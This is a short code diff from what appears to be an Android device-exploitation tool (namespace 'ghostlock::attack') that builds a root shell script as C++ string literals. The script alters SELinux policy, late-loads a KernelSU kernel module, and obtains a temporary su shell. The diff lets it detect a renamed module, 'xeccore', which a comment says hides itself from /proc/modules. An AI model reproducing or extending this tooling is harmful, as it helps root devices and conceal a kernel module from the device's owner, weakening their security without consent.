@@ -396,7 +396,7 @@ namespace ghostlock::attack {
             "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
             "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
             "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
-            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+            "if grep -qE '^(kernelsu|xeccore)[[:space:]]' /proc/modules 2>/dev/null; then\n"
             "  KSU_ALREADY=1\n"
             "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
             "else\n"
@@ -427,10 +427,18 @@ namespace ghostlock::attack {
             "  if [ \"$KS_OUT\" != \"/dev/null\" ]; then cat \"$KS_OUT\" >>\"$LOG\" 2>/dev/null; rm -f \"$KS_OUT\"; fi\n"
             "  echo \"[*] late-load exit=$KS_RC\" >>\"$LOG\"\n"
             "fi\n"
-            "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
+                        /* XEC: 2026-11-13 (audit F16) -- the release LKM renames the module
+             * to `xeccore` and unlinks it from /proc/modules when it can, so
+             * `grep kernelsu /proc/modules` is false even after a successful
+             * load. That turned every release build into "module not loaded",
+             * the run exited before the enforcing restore below, and the failure
+             * exit did not put SELinux back on its own. Accept either name (and
+             * require the field separator so a `mykernelsu_helper` cannot
+             * match). */
+"echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
             "KSU_READY=0\n"
             "for i in $(seq 1 50); do\n"
-            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
+            "  if grep -qE '^(kernelsu|xeccore)[[:space:]]' /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
             "  sleep 0.1\n"
             "done\n"
             "if [ \"$KSU_READY\" -ne 1 ]; then\n"
